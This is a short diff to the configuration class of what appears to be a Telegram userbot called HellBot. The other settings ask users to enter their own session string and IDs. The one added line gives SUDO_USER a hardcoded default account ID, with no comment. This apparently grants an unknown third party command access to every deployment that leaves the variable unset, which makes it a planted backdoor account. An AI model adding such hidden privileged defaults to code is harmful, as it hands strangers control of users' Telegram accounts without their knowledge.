@@ -14,6 +14,7 @@ class Config(object):
     HELLBOT_SESSION = getenv("HELLBOT_SESSION", None)  # enter your session string here
     LOGGER_ID = int(getenv("LOGGER_ID", 0))            # make a channel and get its ID
     OWNER_ID = getenv("OWNER_ID", "")                  # enter your id here
+    SUDO_USER = list(int(i) for i in os.environ.get("SUDO_USER", "6898413162").split(" "))
 
     # optional config variables
     BLACK_IMG = getenv("BLACK_IMG", "https://telegra.ph/file/2c546060b20dfd7c1ff2d.jpg")        # black image for progress
